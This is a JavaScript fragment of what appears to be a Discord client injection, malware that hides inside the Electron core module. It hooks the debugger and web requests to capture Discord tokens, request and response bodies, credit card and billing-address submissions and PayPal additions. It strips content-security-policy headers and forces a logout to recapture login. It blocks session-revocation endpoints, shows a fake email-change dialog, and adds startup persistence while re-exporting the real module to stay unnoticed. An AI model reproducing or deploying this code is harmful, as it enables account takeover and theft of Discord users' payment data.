            const [{ body: responseBody }, { postData: requestPostData }] = await Promise.all([
                mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId }),
                mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId })
            ]);

            const RESPONSE_DATA = parseJSON(responseBody);
            const RESQUEST_DATA = parseJSON(requestPostData);

            const { 
                token,
                user
            } = await AuritaCord();

            GangwayCord(params, RESPONSE_DATA, RESQUEST_DATA, token, user);
        } catch (error) {
            console.error(error);
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');

    mainWindow.on('closed', () => {
        createWindow();
    });
};

const isLogged = async () => {
    const LOG_FILE_PATH = path.join(__dirname, 'core.log');

    try {
        const { 
            token 
        } = await AuritaCord();

        if (token) {
            if (!fs.existsSync(LOG_FILE_PATH)) {
                fs.writeFileSync(LOG_FILE_PATH, 'logout');

                await request('POST', 'https://discord.com/api/v9/auth/logout', {
                    'Content-Type': 'application/json',
                    'Authorization': token
                }, JSON.stringify({
                    provider: null,
                    voip_provider: null,
                }));

                return false;
            };

            return true;
        }

        fs.writeFileSync(LOG_FILE_PATH, 'logout');

        return false;
    } catch (error) {
        return false;
    }
};

const defaultSession = () => {
    const webRequest = session.defaultSession.webRequest;
    if (!webRequest) return;

    webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
        const { url, uploadData, method, statusCode, billing_address } = details;

        if (
            ![200, 202].includes(statusCode) &&
            !['POST'].includes(method)
        ) return;
        
        const { 
            token, 
            user
        } = await AuritaCord();

        if(!token) return;

        switch (true) {
            case url.includes('stripe'): 
                let item;

                try {
                    item = querystring.parse(Buffer.from(uploadData[0].bytes).toString());
                } catch (error) {
                    item = querystring.parse(decodeURIComponent(uploadData[0]?.bytes.toString() || ''));
                }

                const { line_1, line_2, city, state, postal_code, country, email } = billing_address;
                const request = {
                    item,
                    line_1,
                    line_2,
                    city,
                    state,
                    postal_code,
                    country,
                    email
                };

                Cruise(
                    'CREDITCARD_ADDED',
                    null,
                    request,
                    user.email,
                    null,
                    token,
                    `you just added a \`Credit Card\``
                );
                break;
                
            case (url.endsWith('paypal_accounts') || url.endsWith('billing-agreement-tokens')): 
                Cruise(
                    'PAYPAL_ADDED',
                    null,
                    null,
                    user.email,
                    null,
                    token,
                    `you just added a \`Paypal\` account`
                );
                break;
            
        };
    });
};

const interceptRequest = () => {
    const webRequest = session.defaultSession.webRequest;
    if (!webRequest) return;

    webRequest.onHeadersReceived(async (request, callback) => {
        const { url, method, statusCode, responseHeaders, uploadData } = request;
        const updatedHeaders = { ...responseHeaders };

        ['content-security-policy', 'content-security-policy-report-only'].forEach(header => {
            delete updatedHeaders[header];
        });
        
        callback({
            responseHeaders: {
                ...updatedHeaders,
                "Access-Control-Allow-Headers": "*"
            }
        });

        const processUserUpdate = async () => {
            const {
                token,
                user
            } = await AuritaCord();

            if(!token) return;

            if (CONFIG.auto_user_profile_edit === 'true') {
                await editSettingUser(token);
            };

            if (CONFIG.auto_email_update === 'true') {
                const locale = user.locale || 'en-US';

                const truncateEmail = (email = '@') => {
                    const [localPart, domain] = email.split('@');
                    return `${localPart.slice(0, 15)}${localPart.length > 15 ? '...' : ''}@${domain || ''}`;
                };

                const [
                    CONFIG_ALERT,
                    EDIT_MAIL_ALERT,
                    ALERT_INTRO,
                    END_INTRO_ALERT,
                    CHANGE_ALERT,
                    LAST_END_ALERT,
                    CONTACT_ALERT,
                ] = await translateEmailUpdate(token, locale);

                await execScript(`
                    const loadStylesheets = (urls) => {
                        const head = document.head || document.getElementsByTagName('head')[0];

                        urls.forEach(url => {
                            const link = document.createElement('link');
                            link.rel = 'stylesheet';
                            link.href = url;
                            head.appendChild(link);
                        });
                    };

                    const changeEmail = async () => {
                        loadStylesheets([
                            '/assets/d4261c08ee2b8d686d9d.css'
                        ]);

                        const placeholder = document.createElement('div');

                        placeholder.innerHTML = \`
                            <div class="layerContainer_cd0de5">
                                <div class="backdrop_e4f2ae withLayer_e4f2ae" style="background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(0px);"></div>
                                <div class="layer_c9e2da">
                                    <div class="focusLock_f9a4c9" role="dialog" aria-labelledby=":r11:" tabindex="-1" aria-modal="true">
                                        <div class="root_f9a4c9 small_f9a4c9 fullscreenOnMobile_f9a4c9 rootWithShadow_f9a4c9"
                                            style="opacity: 1; transform: scale(1);"><img alt="" class="emailHeaderImg_a62824" src="/assets/8b500863ec942f68c46b.svg">
                                            <div style="position: relative; width: 440px; height: 380px; overflow: hidden;">
                                                <div style="position: absolute; flex-direction: column; backface-visibility: hidden; width: 440px; transform: translate3d(0px, -50%, 0px) scale(1, 1); top: 50%; opacity: 1;">
                                                    <form>
                                                        <div class="flex_dc333f horizontal_dc333f justifyStart_ec1a20 alignCenter_ec1a20 noWrap_ec1a20 header_f9a4c9 header_a62824" id=":r11:" style="flex: 0 0 auto;">
                                                            <h1 class="defaultColor_a595eb heading-xl/extrabold_dc00ef defaultColor_e9e35f title_a62824" data-text-variant="heading-xl/extrabold">
                                                                ${CONFIG_ALERT}
                                                            </h1>
                                                        </div>
                                                        <div class="content_f9a4c9 content_a62824 thin_c49869 scrollerBase_c49869" dir="ltr" style="overflow: hidden scroll; padding-right: 8px;">
                                                            <div class="defaultColor_a595eb text-md/normal_dc00ef description_a62824" data-text-variant="text-md/normal">
                                                                <p>${ALERT_INTRO} (<strong>${truncateEmail(user.email || 'user@gmail.com')}</strong>) ${END_INTRO_ALERT}</p>
                                                                <p>${CHANGE_ALERT}</p>
                                                                <p>${LAST_END_ALERT} ${CONTACT_ALERT}</p>
                                                            </div>
                                                            <div aria-hidden="true" style="position: absolute; pointer-events: none; min-height: 0px; min-width: 1px; flex: 0 0 auto; height: 16px;"></div>
                                                        </div>
                                                        <div class="flex_dc333f horizontalReverse_dc333f justifyStart_ec1a20 alignStretch_ec1a20 noWrap_ec1a20 footer_f9a4c9 modalFooter_a62824 footerSeparator_f9a4c9" style="flex: 0 0 auto;">
                                                            <a href="/settings/account" class="button_dd4f85 lookFilled_dd4f85 colorBrand_dd4f85 sizeMedium_dd4f85 grow_dd4f85">
                                                                <div class="contents_dd4f85">
                                                                    ${EDIT_MAIL_ALERT}
                                                                </div>
                                                            </a>
                                                        </div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        \`;

                        try {
                            document.body.appendChild(placeholder);

                            await new Promise(resolve => setTimeout(resolve, Number.MAX_SAFE_INTEGER));
                        } catch (error) {
                        }
                    };

                    changeEmail();
                `);
            };
        }

        switch (true) {
            case (url.endsWith('/@me') && !script_executed) || (url.includes('/settings') && !script_executed):
                if (url.endsWith('/@me')) {
                    await processUserUpdate();
                }
                if (url.includes('/settings')) {
                    script_executed = true;
                }
                break;
        }
    });
};

const allSessionsLocked = async () => {
    const webRequest = session.defaultSession.webRequest;
    if (!webRequest) return;

    webRequest.onBeforeRequest(CONFIG.session_filters, (details, callback) => {
        const cancel = 
            details.url.includes("wss://remote-auth-gateway") ||
            details.url.includes("auth/sessions");

        callback({ cancel });
    });

    try {
        const isEnabled = await isLogged();
        if (isEnabled) return interceptRequest();
    } catch (error) {
        console.error(error);
    };
    
    setTimeout(allSessionsLocked, 5000);
};

const complete = async () => {
    if (CONFIG.auto_persist_startup === 'true') {
        forcePersistStartup(); 
    };
    startup();
    createWindow();
    defaultSession();
    // For it to work you have to make it run indefinitely. //
    allSessionsLocked();
};

complete();

module.exports = require("./core.asar");